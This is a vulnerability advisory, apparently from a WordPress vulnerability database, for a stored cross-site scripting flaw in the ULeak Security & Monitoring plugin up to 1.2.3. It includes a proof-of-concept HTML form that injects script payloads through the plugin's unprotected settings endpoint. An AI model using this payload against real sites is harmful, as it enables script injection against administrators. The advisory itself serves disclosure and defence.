## WordPress Plugin Vulnerabilities

# ULeak Security & Monitoring <= 1.2.3 - Subscriber+ Stored Cross-Site Scripting

### Description

The plugin does not have authorisation and CSRF checks when updating its settings, and is also lacking sanitisation as well as escaping in some of them, which could allow any authenticated users such as subscriber to perform Stored Cross-Site Scripting attacks against admins viewing the settings

### Proof of Concept

As any authenticated user:
<html>
<body>
<form action="https://example.com/wp-admin/admin-post.php" method="POST">
<input type="hidden" name="action" value="add\_apikey" />
<input type="hidden" name="ul\_username" value='"><script>alert(/XSS1/)</script>' />
<input type="hidden" name="ul\_passwort" value="" />
<input type="hidden" name="ul\_apikey" value='"><script>alert(/XSS2/)</script>' />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
